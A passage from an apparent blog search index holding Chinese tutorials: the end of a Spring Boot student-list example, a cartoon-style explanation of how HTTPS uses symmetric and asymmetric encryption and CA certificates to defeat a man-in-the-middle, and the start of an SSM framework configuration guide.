StudentController &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  @Autowired</span><br><span class="line">  StudentMapper studentMapper;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  @RequestMapping(“&#x2F;listStudent”)</span><br><span class="line">  public String listStudent(Model model) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;span class&#x3D;&quot;hljs-type&quot;&gt;List&lt;&#x2F;span&gt;&lt;&lt;span class&#x3D;&quot;hljs-type&quot;&gt;Student&lt;&#x2F;span&gt;&gt; students &#x3D; studentMapper.findAll();</span><br><span class="line">model.addAttribute(&lt;span class&#x3D;&quot;hljs-string&quot;&gt;&quot;students&quot;&lt;&#x2F;span&gt;, students);</span><br><span class="line">&lt;span class&#x3D;&quot;hljs-keyword&quot;&gt;return&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;hljs-string&quot;&gt;&quot;listStudent&quot;&lt;&#x2F;span&gt;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>第五步：编写 listStudent.jsp 文件</p></blockquote><p>我们简化一下 JSP 的文件，仅显示两个字段的数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language&#x3D;&quot;java&quot; contentType&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;</span><br><span class="line">       pageEncoding&#x3D;&quot;UTF-8&quot;%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%@ taglib uri&#x3D;“http:&#x2F;&#x2F;java.sun.com&#x2F;jsp&#x2F;jstl&#x2F;core&quot; prefix&#x3D;“c”%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;table align&#x3D;‘center’ border&#x3D;‘1’ cellspacing&#x3D;‘0’&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;id&lt;&#x2F;td&gt;</span><br><span class="line">        &lt;td&gt;name&lt;&#x2F;td&gt;</span><br><span class="line">    &lt;&#x2F;tr&gt;</span><br><span class="line">    &lt;c:forEach items&#x3D;“$&#123;students&#125;” var&#x3D;“s” varStatus&#x3D;“st”&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;$&#123;s.id&#125;&lt;&#x2F;td&gt;</span><br><span class="line">            &lt;td&gt;$&#123;s.name&#125;&lt;&#x2F;td&gt;</span><br><span class="line">        &lt;&#x2F;tr&gt;</span><br><span class="line">    &lt;&#x2F;c:forEach&gt;</span><br><span class="line">&lt;&#x2F;table&gt;</span><br></pre></td></tr></table></figure><blockquote><ul><li>第六步：重启服务器运行</li></ul></blockquote><p>因为往 pom.xml 中新增加了依赖的包，所以自动重启服务器没有作用，我们需要手动重启一次，然后在地址输入：localhost:8080/listStudent 查看效果：</p><p><img data-src="https://images.weserv.nl/?url=upload-images.jianshu.io/upload_images/7896890-5fd3c075d07b5840.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload"></p><blockquote><p>以上。</p></blockquote><hr></h1></div>        </div>]]></content>
      
      
      <categories>
          
          <category> 工作学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SpringBoot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漫话：什么是 https ?这应该是全网把 https 讲的最好的一篇文章了</title>
      <link href="%E4%BB%80%E4%B9%88%E6%98%AF%20https.html"/>
      <url>%E4%BB%80%E4%B9%88%E6%98%AF%20https.html</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><!--页面头部添加--><h1 id="https"><a href="#https" class="headerlink" title="https"></a>https</h1><p>今天这篇文章，讲通过对话的形式，让你由浅入深着知道，为什么 Https 是安全的。</p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzAyMmJkOWNmM2VhNzU3ZjAxNDc3YzhjZWVlMDUzOGY1Lg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzU1ZDVkZWRmYzFjNWM5YjcwY2MzZjJkZGNkNjlkZmFhLg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5L2Q0YWQwOGI1YWIyZDlkZDUyYzM5ZWUzZTg5MGMxMDkwLg?x-oss-process=image/format,png" class="lazyload"></p><h2><a name="t0"></a><a id="_11"></a>一、对称加密</h2><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5L2JiZjBiZmQ2NWQyNTk5Yzg1NjFlMmYyZmM5MDE3NjY3Lg?x-oss-process=image/format,png" class="lazyload"></p><p>一禅：在每次发送真实数据之前，服务器先生成一把密钥，然后先把密钥传输给客户端。之后服务器给客户端发送真实数据的时候，会用这把密钥对数据进行加密，客户端收到加密数据之后，用刚才收到的密钥进行解密。如图：</p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5L2U0YTUyYzIyYWU2OWEwMTgxYzE2ZTQ5NjA2MWIxZGFhLg?x-oss-process=image/format,png" class="lazyload"></p><p>当然，如果客户端要给服务器发送数据，也是采用这把密钥来加密，这里为了方便，我采用单方向传输的形式</p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5L2JiYWVjYjA2OWJkM2RlODEzYzJiN2JjYmFmNDg1ZDMyLg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5L2QxN2M1YmFiNWRlZWU4OTBhYmEyODkxMzE3YmRhMmUyLg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzhlYjIyNWI3NjJhMzYzZjVmYjMwMmYzYjhhMWY0MTFmLg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzdkNTE0NzQ4YWEyNDNjYWJhMzFiNTAxZTE2NTBhNzM4Lg?x-oss-process=image/format,png" class="lazyload"></p><p>小白：那万一密钥在传输的过程中被别人截取了怎么吧?</p><p>例如：</p><p>假如服务器用明文的方式传输密钥给客户端，然后密钥被中间人给捕获了，那么在之后服务器和客户端的加密传输过程中，中间人也可以用他捕获的密钥进行解密。这样的话，加密的数据在中间人看来和明文没啥两样</p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzAxNTJmNzQ4NTk4MjE1Mzk2ZGJhOTdmNWI5ZDE3ZjNlLg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzVhNjcxOGFhM2VhZjIwN2Y0NjAzNGU1MmNmZGMyYzg3Lg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5L2JiNzNlMTBlNDY1OTc0YjY5NDBiNGQ3ZDNiNzUwNTlkLg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzE4MjJiMTUyMjkwZTAwOGUwMjIxMGFjYzZmYTIzYjNjLg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5Lzk5MDU4YTU5YWNjMjE3OGY2NGY1MjgxOWJhODUxMDBlLg?x-oss-process=image/format,png" class="lazyload"></p><h2><a name="t1"></a><a id="_57"></a>二、非对称加密</h2><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzE0MjIwOGZlZDM3MzQ1M2FjYTUzYzU3YWRjYzNkMmE0Lg?x-oss-process=image/format,png" class="lazyload"></p><p>一禅：这种方法就是，让客户端和服务器都拥有两把钥匙，一把钥匙是公开的(全世界知道都没关系)，我们称之为公钥；另一把钥匙则是保密的(只有自己本人才知道)，我们称之为私钥。这且，<strong>用公钥加密的数据，只有对应的私钥才能解密；用私钥加密的数据，只有对应的公钥才能解密</strong>。</p><p>这样，服务器在给客户端传输数据的过程中，可以用客户端明文给他的公钥进行加密，然后客户端收到后，再用自己的私钥进行解密。客户端给服务器发送数据的时候也一样采取这样的方式。这样就能保持数据的安全传输了。画个图理解一下：</p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5L2UwNzg1NmI4ODliZDU5NTQ1NWQ2MmViMmM3ZTc1ZjA0Lg?x-oss-process=image/format,png" class="lazyload"><br><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5L2RhMTBjNzFhZTc0NjQwZmFmOGUwM2MxMmQ2Y2ZmYjMyLg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5L2IwYTIwNzRhNGE0ZTk4ZmViZDgzMjhmMjkxNTc3N2EzLg?x-oss-process=image/format,png" class="lazyload"><br><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5Lzc5NTdiZDZlM2ViM2NiMDkyMDk4YmM5YjA0NjQzODgxLg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzgxYjk4ZTk3ODUzNjM4OGE3NmZmYmZiNWM3ZjM3NjczLg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzQzZjMxNmU2NTdkMzdiMGY1YWU2MGE3MTllNGM3ZGM1Lg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzkwZDM0ZGM1YzQzNjE2MWE2ZDY0ODg2MWEwM2U0ZWY0Lg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzIwMWIyYzRhYjhkODg0YjQ0ZGJhNWFkZjY1NTJkOTNjLg?x-oss-process=image/format,png" class="lazyload"></p><p>一禅：处理方式就是结合 对称加密+非对称加密这两种方式，我们可以用非对称加密的方式来传输对称加密过程中的密钥，之后我们就可以采取对称加密的方式来传输数据了。具体是这样子的：</p><p>服务器用明文的方式给客户端发送自己的公钥，客户端收到公钥之后，会生成一把密钥(对称加密用的)，然后用服务器的公钥对这把密钥进行加密，之后再把密钥传输给服务器，服务器收到之后进行解密，最后服务器就可以安全着得到这把密钥了，而客户端也有同样一把密钥，他们就可以进行对称加密了。</p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzJmNjU0ZjFhMzdhOWZmOTgyMjBhYjNjMWMwYzhiYjFjLg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5L2UxMTExYmYyMTE3OTVjNjQ1ZDgxMzJiZDlmYmY1NjAyLg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5L2VkYTRmYjU5MDcwODY3Mzk0YmQwMTUwZTQzODAxZmMyLg?x-oss-process=image/format,png" class="lazyload"></p><p>小白：例如：</p><p>服务器以明文的方式给客户端传输公钥的时候，中间人截取了这把属于服务器的公钥，并且把中间人自己的公钥冒充服务器的公钥传输给了客户端。</p><p>之后客户端就会用中间人的公钥来加密自己生成的密钥。然后把被加密的密钥传输给服务器，这个时候中间人又把密钥给截取了，中间人用自己的私钥对这把被加密的密钥进行解密，解密后中间人就可以获得这把密钥了。</p><p>最后中间人再对这把密钥用刚才服务器的公钥进行加密，再发给服务器。如图：</p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5L2JkNGExZjBhYWU2ZjI2MDA0ZjE4NDRlMjFmMzkxZjg3Lg?x-oss-process=image/format,png" class="lazyload"></p><p>毫无疑问，在这个过程中，中间人获取了对称加密中的密钥，在之后服务器和客户端的对称加密传输中，这些加密的数据对中间人来说，和明文没啥区别。</p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzZlZWI4YzM0MzNjNzU1MDcxYTBhNDQyMDJmYTVmNzMyLg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzVjOTViZTBhYmNmYmYzYTI2MDkyYTFjMDM2NmM2NmUyLg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5L2U2ZGRhMWY5ZjE4ZmZjYTJmN2ZkNTA1MjIwMGU4YmIxLg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzA5MmJlYjRjYjE1NGExN2YyNjk2Y2JlM2FiZjIwYWI5Lg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzJmM2E0Y2U5NmE5ZTEyMzIwOTA2NzRiZjVjMTk2NTIxLg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzUwODRiNmQzNzYxYTFkMTMyMDA0YTgwMDUxNjAxMzAwLg?x-oss-process=image/format,png" class="lazyload"></p><h2><a name="t2"></a><a id="_139"></a>数字证书登场</h2><p>在刚才的讲解中，我们知道，之所以非对称加密会不安全，是因为客户端不知道这把公钥是否是服务器的，因此，我们需要找到一种策略来证明这把公钥就是服务器的，而不是别人冒充的。</p><p>解决这个问题的方式就是使用数字证书，具体是这样的：</p><p>我们需要找到一个拥有公信力、大家都认可的<strong>认证中心(CA)</strong>。</p><p>服务器在给客户端传输公钥的过程中，会把公钥以及服务器的个人信息通过Hash算法生成<strong>信息摘要</strong>。如图</p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5L2Q2YWQxMTEyNjlhOWE4ODQ4N2NiZTQ0MDgxYzU0M2Q5Lg?x-oss-process=image/format,png" class="lazyload"></p><p>为了防止信息摘要被人调换，服务器还会用CA提供的私钥对信息摘要进行加密来形成<strong>数字签名</strong>。如图:</p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5Lzk2MTExY2M5M2NkOTk4YjE0OTNiODkyYTQxZDhhODcyLg?x-oss-process=image/format,png" class="lazyload"></p><p>并且，最后还会把原来没Hash算法之前的个人信息以及公钥 和 数字签名合并在一起，形成<strong>数字证书</strong>。如图</p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5L2RmNGFkYzM5Y2Y2YmEwYmUzODg4N2QwZjI1YjM3NWUwLg?x-oss-process=image/format,png" class="lazyload"></p><p>当客户端拿到这份数字证书之后，就会用CA提供的公钥来对数字证书里面的数字签名进行解密来得到信息摘要，然后对数字证书里服务器的公钥以及个人信息进行Hash得到<strong>另外一份信息摘要</strong>。最后把<strong>两份信息摘要进行对比</strong>，如果一样，则证明这个人是服务器，否则就不是。如图：</p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzIxMjk4NTVhNWUwNjM3N2MzZThhNDNkOTZmYTM4ZmYxLg?x-oss-process=image/format,png" class="lazyload"></p><p>这样，就可以保证服务器的公钥安全着交给客户端了。</p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5L2Y2ZjJkODY1MzBjOGJlMzdiMzU3ZTdhMzllMTU1MGU2Lg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5L2Q0Mzc3OTAyN2JmMDkwZWJhNGVmYjhiMDM1MWViMWY3Lg?x-oss-process=image/format,png" class="lazyload"></p><p>其实，(有些)服务器一开始就向认证中心申请了这些证书了(有没有看过没有证书的网站在地址栏会被标出警告？)，而客户端是，也会内置这些证书。如图：</p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzE4NmE0YjcwNGViOWRhMWM2ZGMxMTYzMzdhMTlhMzFiLg?x-oss-process=image/format,png" class="lazyload"></p><p>当客户端收到服务器传输过来的数据数字证书时，就会在内置的证书列表里，查看是否有解开该数字证书的公钥，如果有则…，如果没有则…</p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzQwZjE2M2ZjMjg5YjU2MmE5Y2Q3NTNhMmMwYmU0NmU2Lg?x-oss-process=image/format,png" class="lazyload"></p><p><img alt data-src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWFnZXMueGlhb3podWFubGFuLmNvbS9waG90by8yMDE5LzI1M2ZiMWJhYTNkNWRhMzg1ZWNkYmJjOTdhMjJmNTJmLg?x-oss-process=image/format,png" class="lazyload"></p><h3><a name="t3"></a><a id="_195"></a>看完有收获？那么希望老铁别吝啬你的三连击哦</h3><p>1、<strong>点赞</strong>，可以让更多的人看到这篇文章<br>2、关注我的原创微信公众号『<strong>苦逼的码农</strong>』，第一时间阅读我的文章。公众号后台回复『电子书』，还送你一份电子书大礼包哦。<br>3、也欢迎关注我的博客哦。</p><h3><a name="t4"></a><a id="_200"></a><strong>作者简洁</strong></h3><blockquote><p>作者：帅地，一位热爱、认真写作的小伙，目前维护原创公众号：<strong>『苦逼的码农』</strong>，以写了150多篇文章，专注于写 <strong>算法</strong>、计算机基础知识等提升你内功的文章，期待你的关注。<br><strong>转载说明</strong>：务必注明来源（注明：来源于公众号：苦逼的码农， 作者：帅地）</p></blockquote><pre><code>                    &lt;/div&gt;&lt;link href=&quot;https://csdnimg.cn/release/phoenix/mdeditor/markdown_views-e9f16cbbc2.css&quot; rel=&quot;stylesheet&quot;&gt;    &lt;/div&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 吹牛逼 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> https </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSM框架整合及搭建</title>
      <link href="SSM%E6%A1%86%E6%9E%B6%E6%95%B4%E5%90%88%E5%8F%8A%E6%90%AD%E5%BB%BA.html"/>
      <url>SSM%E6%A1%86%E6%9E%B6%E6%95%B4%E5%90%88%E5%8F%8A%E6%90%AD%E5%BB%BA.html</url>
      
        <content type="html"><![CDATA[<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css" /><!-- <script src="https://cdn.jsdelivr.net/gh/yujiajie01/live2d-widget@V11/autoloadx.js"></script> --><p>SSM框架整合及搭建<br>1、SpringMVC<br>    处理视图层前端请求及控制层接收请求后响应给客户端<br>2、Mybatis<br>    数据访问层</p><p>3、Spring<br>    IOC/DI<br>        控制反转、依赖注入<br>        处理层与层之间的依赖关系，进行解耦<br>    AOP<br>        面向切面编程<br>        处理日志、异常、事务</p><p>1、SpringMVC与Spring不需要整合<br>2、Mybatis与Spring整合数据访问<br>    1、dataSource    数据源<br>    2、SqlSessionFactory    会话工厂<br>    3、SqlSession    会话</p><p>框架搭建<br>1、导入jar包<br>    SpringMVC的jar包<br>    Mybatis的jar包<br>    Spring的jar包<br>    Mybatis与Spring集成的jar包</p><p>2、创建项目的包、创建实体类</p><p>3、添加SpringMVC环境<br>    1、添加SpringMVC核心配置文件 dispatcher-servlet.xml<br>        1) 添加注解的驱动支持，注解所在包的扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 设置注解支持,扫描带有注解类的包 --&gt;</span><br><span class="line">&lt;context:component-scan base-package&#x3D;&quot;controller,service.impl&quot; &#x2F;&gt;</span><br><span class="line">&lt;mvc:annotation-driven &#x2F;&gt;</span><br></pre></td></tr></table></figure><pre><code>2) 添加视图解析器</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 视图解析器 --&gt;</span><br><span class="line">   &lt;bean id&#x3D;&quot;viewResolver&quot; class&#x3D;&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot; &gt;</span><br><span class="line">&lt;!-- 属性名name,属性值value ,给class类的对象中的属性赋值 --&gt;</span><br><span class="line">&lt;property name&#x3D;&quot;prefix&quot; value&#x3D;&quot;&#x2F;WEB-INF&#x2F;jsp&#x2F;&quot;&gt;&lt;&#x2F;property&gt;</span><br><span class="line">&lt;property name&#x3D;&quot;suffix&quot; value&#x3D;&quot;.jsp&quot;&gt;&lt;&#x2F;property&gt;</span><br><span class="line">   &lt;&#x2F;bean&gt;</span><br></pre></td></tr></table></figure><pre><code>3) 静态资源文件处理</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 处理静态资源文件 --&gt;</span><br><span class="line">&lt;mvc:resources location&#x3D;&quot;&#x2F;resource&#x2F;&quot; mapping&#x3D;&quot;&#x2F;resource&#x2F;**&quot; &#x2F;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2、配置web.xml<br>        1) 配置SpringMVC核心控制器及加载核心配置文件                </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 配置SpringMVC核心控制器 --&gt;</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">&lt;servlet-name&gt;dispatcherServlet&lt;&#x2F;servlet-name&gt;</span><br><span class="line">&lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;&#x2F;servlet-class&gt;</span><br><span class="line">&lt;init-param&gt;</span><br><span class="line">&lt;param-name&gt;contextConfigLocation&lt;&#x2F;param-name&gt;</span><br><span class="line">&lt;param-value&gt;classpath:dispatcher-servlet.xml&lt;&#x2F;param-value&gt;</span><br><span class="line">&lt;&#x2F;init-param&gt;</span><br><span class="line">&lt;&#x2F;servlet&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">&lt;servlet-name&gt;dispatcherServlet&lt;&#x2F;servlet-name&gt;</span><br><span class="line">&lt;url-pattern&gt;&#x2F;&lt;&#x2F;url-pattern&gt;</span><br><span class="line">&lt;&#x2F;servlet-mapping&gt;</span><br></pre></td></tr></table></figure><p>3、创建Controller控制器<br>        1) 添加注解映射请求URL</p><p>4、创建JSP页面</p><p>4、Spring集成Mybatis<br>    1) 添加Mybatis环境<br>        添加配置文件mybatis-config.xml，配置文件中不再配置environments，其余的配置保留</p><p>2) 添加Spring配置文件applicationContext.xml<br>        将原有使用MyBatis进行数据访问的对象全部配置到Spring文件中</p><p>1) 数据源 - 第三方提供</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- dataSource 数据源-第三方 --&gt;</span><br><span class="line">&lt;bean id&#x3D;&quot;dataSource&quot; class&#x3D;&quot;org.apache.commons.dbcp.BasicDataSource&quot; &gt;</span><br><span class="line">&lt;property name&#x3D;&quot;driverClassName&quot; value&#x3D;&quot;com.mysql.jdbc.Driver&quot; &#x2F;&gt;</span><br><span class="line">&lt;property name&#x3D;&quot;url&quot; value&#x3D;&quot;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;house?useUnicode&#x3D;true&amp;characterEncoding&#x3D;utf-8&quot; &#x2F;&gt;</span><br><span class="line">&lt;property name&#x3D;&quot;username&quot; value&#x3D;&quot;root&quot; &#x2F;&gt;</span><br><span class="line">&lt;property name&#x3D;&quot;password&quot; value&#x3D;&quot;123456&quot;&#x2F;&gt;</span><br><span class="line">&lt;&#x2F;bean&gt;</span><br></pre></td></tr></table></figure><p>2) 会话工厂</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- sessionFactory 会话工厂集成 --&gt;</span><br><span class="line">&lt;bean id&#x3D;&quot;sqlSessionFactory&quot; class&#x3D;&quot;org.mybatis.spring.SqlSessionFactoryBean&quot; &gt;</span><br><span class="line">&lt;!-- 注入数据源dataSource --&gt;</span><br><span class="line">&lt;property name&#x3D;&quot;dataSource&quot; ref&#x3D;&quot;dataSource&quot; &#x2F;&gt;</span><br><span class="line">&lt;!-- 注入Mybatis配置文件的路径 --&gt;</span><br><span class="line">&lt;property name&#x3D;&quot;configLocation&quot; value&#x3D;&quot;classpath:mybatis-config.xml&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;bean&gt;</span><br></pre></td></tr></table></figure><p> 3) 会话</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- SqlSessionTemplate - Spring提供的会话模板 --&gt;</span><br><span class="line">&lt;bean id&#x3D;&quot;sqlSessionTemplate&quot; class&#x3D;&quot;org.mybatis.spring.SqlSessionTemplate&quot; &gt;</span><br><span class="line">&lt;!-- 只提供了 构造方法注入 --&gt;</span><br><span class="line">&lt;constructor-arg name&#x3D;&quot;sqlSessionFactory&quot; ref&#x3D;&quot;sqlSessionFactory&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;bean&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>5、衔接控制层与service层<br>    1) 在控制层和service层的实现类 加上注解<br>        1) controller层类的注解</p><figure class="highlight plain"><table><tr><td 